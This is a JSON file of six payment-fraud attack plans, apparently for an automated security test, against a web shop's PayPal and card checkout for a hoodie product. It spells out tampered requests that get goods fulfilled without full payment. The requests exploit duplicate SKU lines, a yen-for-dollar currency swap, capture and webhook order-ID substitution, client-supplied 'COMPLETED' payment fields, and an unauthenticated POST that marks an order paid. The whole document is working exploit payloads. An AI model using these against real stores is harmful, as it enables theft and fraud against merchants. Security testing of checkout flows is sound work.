{
  "plans": [
    {
      "name": "Duplicate lines, split totals",
      "idea": "The PayPal pricing code deduplicates items by SKU while the shop-order code sums every submitted line, so two identical lines are charged once but fulfilled twice.",
      "expect": "Two Fogline Hoodies fulfilled after paying only $49.00.",
      "steps": [
        {
          "do": "buy",
          "tamper": {
            "items": [
              {
                "sku": "FOG-HOODIE",
                "qty": 1
              },
              {
                "sku": "FOG-HOODIE",
                "qty": 1
              }
            ]
          },
          "blockCapture": false,
          "save": "b"
        }
      ]
    },
    {
      "name": "Yen amount, dollar goods",
      "idea": "The server forwards a client-supplied currency to PayPal but compares only the numeric capture value with the USD total, ignoring currency_code during fulfillment.",
      "expect": "One Fogline Hoodie fulfilled after paying ¥49 instead of $49.00.",
      "steps": [
        {
          "do": "buy",
          "tamper": {
            "items": [
              {
                "sku": "FOG-HOODIE",
                "qty": 1
              }
            ],
            "currency": "JPY",
            "currency_code": "JPY",
            "amount": {
              "currency_code": "JPY",
              "value": "49.00"
            },
            "purchase_units": [
              {
                "amount": {
                  "currency_code": "JPY",
                  "value": "49.00"
                }
              }
            ]
          },
          "blockCapture": false,
          "save": "b"
        }
      ]
    },
    {
      "name": "Capture pointed at pricier order",
      "idea": "The capture handler trusts a shop-order identifier supplied in the capture request body or header instead of deriving the shop order exclusively from the captured PayPal order.",
      "expect": "Four Fogline Hoodies fulfilled using the capture for a separately approved one-hoodie PayPal order.",
      "steps": [
        {
          "do": "request",
          "method": "POST",
          "path": "/api/paypal/orders",
          "body": {
            "items": [
              {
                "sku": "FOG-HOODIE",
                "qty": 4
              }
            ]
          },
          "times": 1,
          "together": false,
          "save": "a"
        },
        {
          "do": "buy",
          "tamper": {
            "items": [
              {
                "sku": "FOG-HOODIE",
                "qty": 1
              }
            ]
          },
          "blockCapture": true,
          "save": "b"
        },
        {
          "do": "request",
          "method": "POST",
          "path": "/api/paypal/orders/{{b.paypalOrderId}}/capture",
          "body": {
            "orderId": "{{a.body.orderId}}",
            "shopOrderId": "{{a.body.orderId}}",
            "custom_id": "{{a.body.orderId}}",
            "invoice_id": "{{a.body.orderId}}",
            "items": [
              {
                "sku": "FOG-HOODIE",
                "qty": 4
              }
            ]
          },
          "headers": {
            "x-shop-order-id": "{{a.body.orderId}}"
          },
          "times": 1,
          "together": false,
          "save": "c"
        }
      ]
    },
    {
      "name": "Real capture webhook, new beneficiary",
      "idea": "The webhook handler fulfills whichever shop order is named by resource.custom_id or invoice_id without proving that the referenced capture belongs to that order or was not already consumed by another order.",
      "expect": "A new four-hoodie order is fulfilled from a $49 capture, in addition to the legitimately purchased hoodie.",
      "steps": [
        {
          "do": "request",
          "method": "POST",
          "path": "/api/paypal/orders",
          "body": {
            "items": [
              {
                "sku": "FOG-HOODIE",
                "qty": 4
              }
            ]
          },
          "times": 1,
          "together": false,
          "save": "a"
        },
        {
          "do": "buy",
          "tamper": {
            "items": [
              {
                "sku": "FOG-HOODIE",
                "qty": 1
              }
            ]
          },
          "blockCapture": false,
          "save": "b"
        },
        {
          "do": "webhook",
          "event": "PAYMENT.CAPTURE.COMPLETED",
          "edit": {
            "resource.id": "{{b.captureId}}",
            "resource.custom_id": "{{a.body.orderId}}",
            "resource.invoice_id": "{{a.body.orderId}}",
            "resource.amount.value": "196.00",
            "resource.amount.currency_code": "USD",
            "resource.supplementary_data.related_ids.order_id": "{{b.paypalOrderId}}"
          },
          "signed": true,
          "times": 1
        }
      ]
    },
    {
      "name": "Card checkout with prepaid proof",
      "idea": "The card-order handler trusts client-supplied payment status or an existing PayPal capture proof, or creates a fulfilled order before validating that a usable card was supplied; this differs from submitting a formally declined card.",
      "expect": "Two Fogline Hoodies fulfilled without any card charge by supplying an empty card with completed-payment fields referencing the legitimate capture.",
      "steps": [
        {
          "do": "request",
          "method": "POST",
          "path": "/api/checkout/card",
          "body": {
            "items": [
              {
                "sku": "FOG-HOODIE",
                "qty": 2
              }
            ],
            "email": "shopper@example.com",
            "card": {},
            "status": "fulfilled",
            "paid": true,
            "paymentStatus": "COMPLETED",
            "captureStatus": "COMPLETED",
            "captureId": "{{legit.captureId}}",
            "paypalOrderId": "{{legit.paypalOrderId}}",
            "payment": {
              "status": "COMPLETED",
              "captureId": "{{legit.captureId}}"
            }
          },
          "times": 1,
          "together": false,
          "save": "a"
        }
      ]
    },
    {
      "name": "Write the order paid directly",
      "idea": "Although the browser only reads /api/orders/{id}, the same resource may accept an unauthenticated POST that merges status and payment fields into the stored pending order.",
      "expect": "Three Fogline Hoodies marked fulfilled without a new payment, using the legitimate capture only as copied proof fields.",
      "steps": [
        {
          "do": "request",
          "method": "POST",
          "path": "/api/paypal/orders",
          "body": {
            "items": [
              {
                "sku": "FOG-HOODIE",
                "qty": 3
              }
            ]
          },
          "times": 1,
          "together": false,
          "save": "a"
        },
        {
          "do": "request",
          "method": "POST",
          "path": "/api/orders/{{a.body.orderId}}",
          "body": {
            "status": "fulfilled",
            "paid": true,
            "paymentStatus": "COMPLETED",
            "captureStatus": "COMPLETED",
            "captureId": "{{legit.captureId}}",
            "paypalOrderId": "{{legit.paypalOrderId}}"
          },
          "times": 1,
          "together": false,
          "save": "c"
        }
      ]
    }
  ]
}